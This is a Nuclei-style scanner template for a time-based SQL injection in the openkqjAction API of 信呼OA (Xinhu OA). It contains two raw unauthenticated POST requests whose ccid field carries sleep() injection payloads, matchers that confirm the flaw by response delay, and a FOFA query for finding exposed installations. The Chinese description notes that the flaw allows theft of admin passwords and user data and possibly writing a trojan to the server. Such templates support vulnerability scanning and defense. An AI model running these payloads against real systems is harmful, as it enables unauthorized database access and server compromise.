http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          {"a":{"data":"fingerprint","ccid":"1' or sleep(2)#'","fingerprint":"3"}}
        - |
          POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          {"a":{"data":"fingerprint","ccid":"1' or sleep(4)#'","fingerprint":"3"}}
id: xinhuOA-openkqjAction-sql-time
info:
    author: Superhero
    description: |-
        fofa: app="信呼-OA系统"
        信呼OA openkqjAction 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 信呼OA openkqjAction SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/cKOV-_IdA2dU8OX5sLAY3w
    severity: high
    tags: []
